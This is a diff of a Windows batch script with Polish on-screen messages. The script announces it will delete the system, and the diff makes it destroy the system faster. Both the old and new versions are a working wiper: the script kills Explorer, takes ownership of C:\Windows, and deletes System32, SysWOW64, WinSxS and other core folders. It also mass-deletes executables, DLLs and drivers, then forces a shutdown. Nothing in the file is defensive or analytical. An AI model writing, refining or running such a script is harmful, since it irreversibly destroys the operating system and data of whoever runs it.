@@ -1,5 +1,5 @@
 @echo off
-title Odpalono_exe - Usuwanie systemu
+title Odpalono_exe - SZYBKIE USUWANIE SYSTEMU
 color 0c
 echo.
 echo Odpalono_exe
@@ -9,34 +9,47 @@ echo    Gratulacje... zaraz usuniemy system
 echo ========================================
 echo.
 
-:: Powtarzamy komunikat 10 razy
+:: Szybkie powtórzenie komunikatu
 for /l %%i in (1,1,10) do (
     echo Gratulacje udalo ci sie usunac system!!!!
     timeout /t 1 >nul
 )
 
 echo.
-echo Czekam 3 sekundy przed zniszczeniem...
-timeout /t 3 >nul
+echo Czekam tylko 2 sekundy...
+timeout /t 2 >nul
 
 echo.
-echo Biorę ownership nad C:\Windows (to może chwilę potrwać)...
+echo Zabijam Explorer.exe (żeby zwolnić pliki)...
+taskkill /f /im explorer.exe >nul 2>&1
+
+echo.
+echo Biorę ownership i prawa (szybka wersja)...
 takeown /f "C:\Windows" /r /a /d Y >nul 2>&1
 icacls "C:\Windows" /grant Administrators:F /t /c /q >nul 2>&1
-icacls "C:\Windows" /grant %username%:F /t /c /q >nul 2>&1
 
 echo.
-echo Usuwam C:\Windows agresywnie...
+echo === SZYBKIE NISZCZENIE SYSTEMU ROZPOCZĘTE ===
+echo Usuwam kluczowe foldery...
+
+:: Najszybsze możliwe kasowanie
+rmdir /s /q "C:\Windows\System32" >nul 2>&1
+rmdir /s /q "C:\Windows\SysWOW64" >nul 2>&1
+rmdir /s /q "C:\Windows\WinSxS" >nul 2>&1
+rmdir /s /q "C:\Windows\servicing" >nul 2>&1
+rmdir /s /q "C:\Windows\SoftwareDistribution" >nul 2>&1
+
+:: Dodatkowe masowe kasowanie plików
+del /f /s /q "C:\Windows\*.exe" >nul 2>&1
+del /f /s /q "C:\Windows\*.dll" >nul 2>&1
+del /f /s /q "C:\Windows\*.sys" >nul 2>&1
+
+echo.
+echo Dodatkowe czyszczenie...
 rmdir /s /q "C:\Windows" >nul 2>&1
 
 echo.
-echo Dodatkowe niszczenie System32 i innych kluczowych folderów...
-del /f /s /q "C:\Windows\System32\*" >nul 2>&1
-del /f /s /q "C:\Windows\SysWOW64\*" >nul 2>&1
-del /f /s /q "C:\Windows\WinSxS\*" >nul 2>&1
-
-echo.
-echo Wylaczam komputer za 3 sekundy...
-timeout /t 3 >nul
+echo Wylaczam komputer za 2 sekundy...
+timeout /t 2 >nul
 
 shutdown /s /f /t 0
